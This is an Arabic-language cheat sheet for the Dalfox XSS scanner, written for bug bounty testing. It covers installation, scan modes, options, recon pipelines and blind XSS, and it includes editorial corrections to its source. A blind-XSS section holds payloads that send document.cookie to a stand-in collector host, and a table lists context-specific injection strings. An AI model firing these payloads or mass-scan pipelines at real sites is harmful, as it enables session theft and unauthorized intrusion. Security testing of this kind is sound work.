<a id="-dalfox---xss-scanning-framework"></a>
# 🦊 Dalfox — إطار عمل لفحص ثغرات XSS

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Powerful XSS Scanner & Analysis Tool
```

يصف الشعار Dalfox بأنها أداة قوية لفحص XSS وتحليلها.

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [ما هي Dalfox؟](#-what-is-dalfox)
- [التثبيت](#-installation)
- [الاستخدام الأساسي](#-basic-usage)
- [أنماط الفحص](#-scanning-modes)
- [خيارات متقدمة](#-advanced-options)
- [ثغرات XSS العمياء (Blind XSS)](#-blind-xss)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-dalfox"></a>
## 🎯 ما هي Dalfox؟

> **توافق الإصدارات:** تتبع أوامر هذا الأصل عائلة Dalfox v2 المكتوبة بـ Go. توثق النسخة الحديثة انتقالًا إلى v3 بـ Rust وتغييرات مثل `--workers` بدل `-w` و`--cookies` بدل `-C`. أبقينا أمثلة الأصل حرفيًا؛ لا تفترض توافقها مع كل إصدار. [دليل الانتقال الرسمي](https://dalfox.hahwul.com/getting-started/migration/).

**Dalfox** أداة قوية لفحص ثغرات البرمجة النصية عبر المواقع (XSS) وتحليلها:

- 🔍 **تحليل المعلمات** — تحديد مواضع انعكاس المدخلات في الاستجابة
- 🎯 **اكتشاف XSS** — الثغرات المنعكسة والمعتمدة على DOM
- 💉 **اختبار XSS العمياء** — رصد تفاعل خارج القناة (Out-of-band)
- ⚡ **سريع** — مكتوب بلغة Go مع تزامن مرتفع في إصدار v2 الذي يتناوله الأصل

<a id="why-dalfox"></a>
### لماذا Dalfox؟

|الميزة|الفائدة|
|---------|---------|
|تحليل ذكي|مدخلات تراعي سياق الحقن|
|اكتشاف WAF|محاولة تفادي جدران WAF الشائعة بحسب الأصل|
|اختبار XSS العمياء|دعم التفاعل خارج القناة (OOB)|
|نمط التنقيب عن المعلمات (Mining)|استخراج معلمات من JavaScript بحسب الأصل|

---

<a id="-installation"></a>
## 🚀 التثبيت

```bash
# التثبيت باستخدام Go، وهو الأسلوب المقترح في الأصل
go install github.com/hahwul/dalfox/v2@latest

# التثبيت باستخدام Homebrew في macOS
brew install dalfox

# التثبيت باستخدام Snap في Linux
sudo snap install dalfox

# التحقق
dalfox version
```

---

<a id="-basic-usage"></a>
## 📖 الاستخدام الأساسي

<a id="single-url"></a>
### عنوان URL واحد

```bash
# فحص أساسي
dalfox url https://example.com/search?q=test

# حفظ المخرجات
dalfox url https://example.com/search?q=test -o results.txt
```

<a id="multiple-urls"></a>
### عناوين URL متعددة

```bash
# من الإدخال القياسي (stdin)
cat urls.txt | dalfox pipe

# من ملف
dalfox file urls.txt

# مع التنفيذ المتوازي
cat urls.txt | dalfox pipe -w 50
```

<a id="silent-mode"></a>
### الوضع الهادئ

```bash
# عرض النتائج فقط بحسب وصف الأصل
dalfox url https://example.com/search?q=test --silence

# دون ألوان
dalfox url https://example.com/search?q=test --no-color
```

---

<a id="-scanning-modes"></a>
## 🔎 أنماط الفحص

<a id="url-mode"></a>
### نمط URL

```bash
# فحص عنوان URL واحد
dalfox url https://example.com/page?param=value

# الفحص مع بيانات الطلب
dalfox url https://example.com/page?param=value -d "post_param=value"
```

<a id="pipe-mode"></a>
### نمط Pipe لاستقبال المخرجات عبر الأنابيب

```bash
# من الإدخال القياسي (stdin)
echo "https://example.com/search?q=test" | dalfox pipe

# عناوين URL متعددة
cat urls_with_params.txt | dalfox pipe
```

<a id="file-mode"></a>
### نمط File للقراءة من ملف

```bash
# من ملف
dalfox file urls.txt

# مع حفظ المخرجات
dalfox file urls.txt -o results.txt
```

<a id="server-mode"></a>
### نمط Server لتشغيل خادم API

يتغير منفذ الطلبات مع إعداد الخادم: يضبط السطر الثاني المنفذ `8080` بينما يشير تعليق الطلب إلى `8090`. احتُفظ بالقيم الأصلية لتوثيق المثال، ويجب مطابقة المنفذ الفعلي.

```bash
# تشغيل خادم API
dalfox server

# منفذ مخصص
dalfox server -p 8080

# ثم إرسال الطلبات:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-advanced-options"></a>
## ⚙️ خيارات متقدمة

<a id="custom-headers"></a>
### ترويسات مخصصة

```bash
# إضافة ترويسة
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# ترويسات متعددة
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

<a id="cookie--authentication"></a>
### ملفات تعريف الارتباط والمصادقة

```bash
# باستخدام ملف تعريف ارتباط
dalfox url https://example.com/search?q=test -C "session=abc123"

# المصادقة الأساسية بحسب مثال الأصل
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

<a id="custom-payloads"></a>
### مدخلات اختبار مخصصة (Custom Payloads)

> **تصحيح:** يحدد `-p` أو `--param` المعلمات المراد تحليلها، وليس نص payload. لذلك لا يضيف مثال `-p '<script>alert(1)</script>'` مدخل اختبار مخصصًا كما يدعي الأصل. يستخدم المثال الآخر `--custom-payload` لملف المدخلات. [مرجع CLI الرسمي](https://dalfox.hahwul.com/reference/cli/).

```bash
# استخدام ملف مدخلات اختبار مخصصة
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# مدخل اختبار مخصص واحد بحسب الأصل؛ راجع تصحيح ‎-p
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# صيغة مدخلات الاختبار في الملف:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

<a id="output-formats"></a>
### تنسيقات المخرجات

> **توافق:** يوثق `--only-poc` مرشحًا لأنواع النتائج مع قيمة، وليس مجرد مفتاح منطقي مستقل. تحقّق من متطلبات إصدارك؛ أُبقي مثال الأصل كما هو. [مرجع CLI](https://dalfox.hahwul.com/reference/cli/).

```bash
# مخرجات JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# عرض النتائج فقط بحسب الأصل؛ راجع توضيح ‎--only-poc
dalfox url https://example.com/search?q=test --only-poc
```

<a id="performance"></a>
### الأداء

```bash
# تحديد عدد العمال للتنفيذ المتوازي
dalfox url https://example.com/search?q=test -w 100

# مهلة الانتظار بالثواني
dalfox url https://example.com/search?q=test --timeout 10

# التأخير بين الطلبات بالمللي ثانية
dalfox url https://example.com/search?q=test --delay 100
```

<a id="waf-evasion"></a>
### تفادي جدار حماية تطبيقات الويب (WAF)

> **تصحيح:** يرتبط Mining بالتنقيب عن أسماء المعلمات؛ تعطيله لا يعني تجاهل بصمة WAF. كما أن وضع `--waf-evasion` لا يضمن تجاوز الحماية؛ يصف دليل الانتقال اختلاف سلوكه بين v2 وv3. [دليل الانتقال](https://dalfox.hahwul.com/getting-started/migration/).

```bash
# استخدام وضع تفادي WAF بحسب الأصل
dalfox url https://example.com/search?q=test --waf-evasion

# تجاهل البصمة بحسب وصف الأصل؛ راجع توضيح Mining
dalfox url https://example.com/search?q=test --skip-mining
```

<a id="proxy"></a>
### الوكيل (Proxy)

```bash
# وكيل HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# للاستخدام مع Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

<a id="-blind-xss"></a>
## 💉 ثغرات XSS العمياء (Blind XSS)

<a id="using-blind-xss-payload"></a>
### استخدام مدخل اختبار لثغرات XSS العمياء

```bash
# مع XSS Hunter أو Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# يضيف الخيار -b وجهات تفاعل لاختبارات XSS العمياء
```

<a id="blind-xss-with-custom-payload"></a>
### اختبار XSS العمياء بمدخل مخصص

```bash
# مدخل اختبار مخصص لـ XSS العمياء
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

<a id="example-blind-payloads"></a>
### أمثلة لمدخلات XSS العمياء

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="basic-commands"></a>
### الأوامر الأساسية

|الأمر|الوصف|
|---------|-------------|
|`dalfox url URL`|فحص عنوان URL واحد|
|`dalfox file file.txt`|الفحص من ملف|
|`cat urls \| dalfox pipe`|الفحص من الإدخال القياسي|
|`dalfox server`|تشغيل خادم API|

<a id="essential-flags"></a>
### الخيارات الأساسية

|الخيار|الوصف|
|------|-------------|
|`-o file.txt`|ملف المخرجات|
|`-w 50`|العمال المنفذون بالتوازي|
|`-H "Header: value"`|ترويسة مخصصة|
|`-C "cookie=value"`|ملف تعريف ارتباط|
|`-b "url"`|وجهة التفاعل لاختبار XSS العمياء|
|`--proxy URL`|وكيل HTTP|
|`--timeout 10`|مهلة انتظار الطلب|

<a id="output-options"></a>
### خيارات المخرجات

|الخيار|الوصف|
|------|-------------|
|`--format json`|مخرجات JSON|
|`--only-poc`|تحديد أنواع إثبات المفهوم PoC؛ راجع التوضيح|
|`--silence`|الوضع الهادئ|
|`--no-color`|مخرجات دون ألوان|

<a id="payload-options"></a>
### خيارات مدخلات الاختبار

|الخيار|الوصف|
|------|-------------|
|`-p "payload"`|مدخل اختبار مخصص بحسب الأصل؛ راجع تصحيح ‎-p|
|`--custom-payload file`|ملف مدخلات الاختبار|
|`--waf-evasion`|وضع تفادي WAF بحسب الأصل|

---

<a id="-bug-bounty-workflows"></a>
## 🎯 مسارات عمل لمكافآت الثغرات

<a id="basic-xss-scan"></a>
### فحص XSS أساسي

```bash
# فحص سريع
dalfox url "https://target.com/search?q=test" --silence
```

<a id="from-url-collection"></a>
### الفحص انطلاقًا من قائمة عناوين URL

```bash
# الجمع بين GAU وDalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# الجمع بين Wayback وDalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

<a id="mass-scanning"></a>
### فحص قوائم كبيرة

```bash
# فحص معلمات عناوين URL
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

<a id="with-gf-patterns"></a>
### باستخدام أنماط GF

```bash
# الجمع بين GF وDalfox
gau target.com | gf xss | dalfox pipe --silence

# مع ترشيح بواسطة httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

<a id="authenticated-scanning"></a>
### الفحص مع المصادقة

```bash
# باستخدام جلسة
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

<a id="comprehensive-pipeline"></a>
### مسار عمل شامل

```bash
# مسار شامل للبحث عن XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

<a id="blind-xss-campaign"></a>
### حملة اختبار XSS العمياء

```bash
# اختبار XSS العمياء لقائمة كبيرة
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# لأشكال إدخال البيانات تحديدًا
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

<a id="-xss-hunting-tips"></a>
## 💡 نصائح للبحث عن XSS

> **ملاحظة للترويسات القديمة:** `X-XSS-Protection` مهجورة؛ لا تعامل وجودها كضمان للحماية. توصي MDN بسياسة CSP مناسبة بدل مرشح XSS القديم. [مرجع MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection).

1. **افحص جميع المعلمات** — لا تكتف بالمعلمات الواضحة
2. **اختبر سياقات مختلفة** — HTML وJavaScript والسمات
3. **استخدم XSS العمياء** — لاختبارات لوحات الإدارة والسجلات
4. **ادرس الربط مع إعادة توجيه مفتوحة (Open Redirect)** — لتقييم أثر أكبر بحسب الحالة
5. **راجع ترويسات الاستجابة** — مثل CSP وX-XSS-Protection الواردتين في الأصل
6. **اختبر معلمات POST** — فقد تُغفل في الاختبار

<a id="common-xss-injection-points"></a>
### مواضع شائعة لحقن XSS

```
- حقول البحث
- حقول الملفات الشخصية للمستخدمين
- التعليقات والملاحظات
- معلمات URL
- ترويسات HTTP مثل Referer وUser-Agent
- أسماء الملفات المرفوعة
- رسائل الأخطاء
```

<a id="context-specific-payloads"></a>
### مدخلات اختبار بحسب سياق الحقن

|السياق|مدخل الاختبار|
|---------|---------|
|HTML|`<script>alert(1)</script>`|
|سمة HTML|`" onmouseover="alert(1)"`|
|JavaScript|`';alert(1)//`|
|URL|`javascript:alert(1)`|

---

<a id="-resources"></a>
## 📚 الموارد

- [مستودع Dalfox على GitHub](https://github.com/hahwul/dalfox)
- [مدخلات اختبار XSS](https://github.com/payloadbox/xss-payload-list)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [منهجية مكافآت الثغرات](../../Bug-Bounty-Methodology/translations/README.ar.md)
- [مدخلات اختبار XSS](../../Payloads/XSS.md)
- [أداة Burp Suite](../../Burp-Suite/translations/README.ar.md)

---

<p align="center">
  <b>🦊 اكتشف ثغرات XSS!</b><br>
  <i>Dalfox — أداة مساعدة للباحث عن XSS</i>
</p>
